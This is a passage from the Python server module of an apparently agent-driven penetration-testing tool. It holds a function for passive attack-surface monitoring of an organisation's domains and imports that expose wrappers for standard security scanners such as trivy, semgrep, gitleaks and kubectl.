    modules: list[str] | None = None,
) -> dict[str, Any]:
    """Continuous Attack Surface Monitoring (ASM) for an organisation.

    Runs passive subdomain discovery (subfinder + crt.sh), certificate
    expiry monitoring, change detection against the last known asset
    inventory, and asset inventory upsert.

    Combine with recon_passive for a full-coverage surface map.
    """
    _require_session(session_id)
    from pencheff.modules.asm import (
        continuous_discovery,
        cert_watch,
        change_detection,
        asset_inventory,
    )

    _mods = set(modules or ["discovery", "cert_watch", "change_detection"])
    results: dict[str, Any] = {"org": org, "root_domain": root_domain}

    if "discovery" in _mods:
        results["discovery"] = await continuous_discovery.discover(
            org=org, root_domain=root_domain
        )
    if "cert_watch" in _mods:
        findings = await cert_watch.watch(root_domain)
        results["cert_watch"] = {"findings_count": len(findings),
                                  "findings": [f.title for f in findings]}
    if "change_detection" in _mods:
        findings = change_detection.snapshot_and_diff(org)
        results["change_detection"] = {"new_assets": len(findings),
                                        "findings": [f.title for f in findings]}

    inventory = asset_inventory.list_assets(org)
    results["asset_count"] = len(inventory)
    results["assets_sample"] = [a.__dict__ for a in inventory[:20]]

    return {"session_id": session_id, "results": results}


# ============================================================================
# Feature 001 — multi-target-scan-pipelines artifact-cluster tool exports.
# These need to be module attributes on ``pencheff.server`` so the API-side
# agent_runner (``getattr(srv, fn_name)``) can resolve them.
# ============================================================================
from pencheff.artifact_tools import (  # noqa: E402,F401
    set_kind_config_for_session,
    artifact_clone_repo,
    artifact_pull_image,
    artifact_download,
    artifact_parse_sbom,
    run_trivy_image,
    run_syft,
    run_grype,
    run_grype_sbom,
    run_hadolint,
    run_checkov,
    run_tfsec,
    run_npm_audit,
    run_pip_audit,
    run_osv_scanner_sbom,
    materialize_pkg_project,
    run_trivy_config,
    run_kube_linter,
    run_kubescape,
)

# Feature 001 — DAST protocol-specific scanner wrappers.
from pencheff.dast_protocol_tools import (  # noqa: E402,F401
    run_graphql_cop,
    run_inql,
    run_grpcurl,
    parse_proto,
)

# Feature 001 — source-code SAST scanner wrappers (consumed by the
# artifact_orchestrator under the kind=source_code allowlist).
from pencheff.source_code_tools import (  # noqa: E402,F401
    run_semgrep,
    run_bandit,
    run_gosec,
    run_brakeman,
    run_eslint,
    run_gitleaks,
    run_yara,
    run_osv_scanner,
)

# Feature 001 — hybrid-cluster Phase B wrappers (k8s live + CI provider API).
from pencheff.hybrid_tools import (  # noqa: E402,F401
    run_kubectl_get,
    run_kubectl_describe,
    run_rakkess,
    run_github_actions_api,
    run_gitlab_ci_api,
    run_jenkins_api,
    run_azure_pipelines_api,
    run_circleci_api,
)
# Also expose the credentials hook so the orchestrators can bind decrypted blobs.
from pencheff.artifact_tools import set_kind_credentials_for_session  # noqa: E402,F401
